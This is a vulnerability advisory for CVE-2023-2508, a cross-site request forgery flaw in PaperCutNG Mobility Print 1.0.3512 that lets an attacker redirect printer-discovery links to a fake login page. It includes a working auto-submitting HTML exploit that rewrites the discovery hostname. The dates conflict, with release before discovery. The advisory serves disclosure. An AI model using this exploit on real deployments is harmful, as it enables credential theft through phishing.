---
slug: advisories/solveig/
title: CSRF in PaperCutNG Mobility Print leads to sophisticated phishing
authors: Carlos Bello
writer: cbello
codename: solveig
product: CSRF in PaperCutNG Mobility Print leads to sophisticated phishing
date: 2023-03-06 12:00 COT
cveid: CVE-2023-2508
severity: 5.3
description: CSRF in PaperCutNG Mobility Print leads to sophisticated phishing
keywords: Fluid Attacks, Security, Vulnerabilities, Python, Papercutng, CSRF, Mobility Print
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | CSRF in PaperCutNG Mobility Print leads to sophisticated phishing  |
| **Code name**         | [Solveig](https://es.wikipedia.org/wiki/Martin_Solveig)            |
| **Product**           | PaperCutNG Mobility Print                                          |
| **Affected versions** | Version 1.0.3512                                                   |
| **State**             | Public                                                             |
| **Release date**      | 2023-03-06                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                                                                                  |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)                               |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N                                                                                |
| **CVSSv3 Base Score** | 5.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-2508](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2508)                                               |

## Description

The `PaperCutNG Mobility Print` version 1.0.3512 application allows an
unauthenticated attacker to perform a CSRF attack on an instance
administrator to configure the clients host (in the "configure printer
discovery" section). This is possible because the application has no
protections against CSRF attacks, like Anti-CSRF tokens, header origin
validation, samesite cookies, etc.

## Vulnerability

This vulnerability occurs because the application has no protections
against CSRF attacks, like Anti-CSRF tokens, header origin validation,
samesite cookies, etc.

## Exploitation

In this scenario an unauthenticated attacker to perform a CSRF attack
on an instance administrator to configure the clients host (in the
"configure printer discovery" section).

Then, when the administrator wants to share the link to users so that
they can configure their credentials, they are actually sending users
to a malicious website that pretends to be the PaperCut NG login, with
the goal of exfiltrating the credentials.

### exploit.html

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
    </head>
    <body>
        <form action=http://127.0.0.1:9163/dns-config method=POST enctype=text/plain>
            <input type=hidden name={"mdnsEnabled":false,"searchDomain":"","subnets":[],"currentStep":"","dnsOptionSelected":"","dnsConfigModified":false,"ZoneIndex":0,"AccessibleIP":"","AccessibleHTTPSPort":0,"dnsFreeEnabled":true,"ExternalIPCIDRs":null,"serverAddresses":["192.168.1.8","Retr02332-MacBookPro.local"],"httpsPort":0,"dnsFreeDiscoveryHostname":"localhost:9999/login.html?redirect="," value=x":"x"} />
        </form>
        <script>document.forms[0].submit();</script>
    </body>
</html>
```

### Evidence of exploitation

<video width="835" height="505" controls="">
    <source src="https://rb.gy/v3078" type="video/mp4">
    <p>PaperCutNG-Mobility-Print</p>
</video>

## Our security policy

We have reserved the ID CVE-2023-2508 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: PaperCutNG Mobility Print 1.0.3512

* Operating System: MacOS

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.papercut.com/>

## Timeline

<time-lapse
  discovered="2023-05-03"
  contacted="2023-05-03"
  replied="2023-05-03"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
